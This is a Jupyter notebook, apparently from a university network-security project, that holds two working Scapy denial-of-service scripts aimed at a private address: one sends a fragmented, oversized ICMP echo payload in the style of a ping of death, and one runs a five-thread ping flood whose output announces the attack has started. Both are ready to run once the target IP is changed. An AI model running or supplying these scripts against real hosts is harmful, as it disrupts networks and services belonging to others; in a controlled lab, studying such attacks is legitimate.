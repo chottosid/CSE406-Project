{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3f378cee",
   "metadata": {},
   "outputs": [
    {
     "ename": "",
     "evalue": "",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31mRunning cells with 'Python 3.12.3' requires the ipykernel package.\n",
      "\u001b[1;31m<a href='command:jupyter.createPythonEnvAndSelectController'>Create a Python Environment</a> with the required packages.\n",
      "\u001b[1;31mOr install 'ipykernel' using the command: '/bin/python3 -m pip install ipykernel -U --user --force-reinstall'"
     ]
    }
   ],
   "source": [
    "from scapy.all import *\n",
    "\n",
    "victim_ip = \"10.13.23.144\"  # Change this\n",
    "payload = b\"A\" * 65506  # Large payload (~60 KB)\n",
    "\n",
    "# Build ICMP packet\n",
    "ip = IP(dst=victim_ip)\n",
    "icmp = ICMP(type=8)  # Echo Request\n",
    "\n",
    "# Scapy will fragment this automatically\n",
    "pkt = ip / icmp / payload\n",
    "\n",
    "# Send and fragment manually at layer 3 (with MTU ~1500)\n",
    "frags = fragment(pkt, fragsize=1480)\n",
    "\n",
    "for frag in frags:\n",
    "    send(frag)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "04d989f2",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Starting ping flood attack on 10.13.23.144 with 5 threads. Press Ctrl+C to stop.\n",
      "Thread FloodThread-1 started flooding 10.13.23.144Thread FloodThread-2 started flooding 10.13.23.144Thread FloodThread-3 started flooding 10.13.23.144\n",
      "Thread FloodThread-4 started flooding 10.13.23.144Thread FloodThread-5 started flooding 10.13.23.144\n",
      "\n",
      "\n",
      "\n"
     ]
    }
   ],
   "source": [
    "from scapy.all import *\n",
    "import threading\n",
    "\n",
    "victim_ip = \"10.13.23.144\"  # Change this to your target IP\n",
    "thread_count = 5             # Number of threads to run in parallel\n",
    "\n",
    "packet = IP(dst=victim_ip) / ICMP(type=8)  # Normal ICMP Echo Request packet\n",
    "\n",
    "def flood():\n",
    "    print(f\"Thread {threading.current_thread().name} started flooding {victim_ip}\")\n",
    "    send(packet, loop=1, inter=0, verbose=0)\n",
    "\n",
    "def main():\n",
    "    threads = []\n",
    "\n",
    "    for i in range(thread_count):\n",
    "        t = threading.Thread(target=flood, name=f\"FloodThread-{i+1}\")\n",
    "        t.start()\n",
    "        threads.append(t)\n",
    "\n",
    "    try:\n",
    "        for t in threads:\n",
    "            t.join()\n",
    "    except KeyboardInterrupt:\n",
    "        print(\"\\nPing flood stopped by user.\")\n",
    "\n",
    "if __name__ == \"__main__\":\n",
    "    print(f\"Starting ping flood attack on {victim_ip} with {thread_count} threads. Press Ctrl+C to stop.\")\n",
    "    main()\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
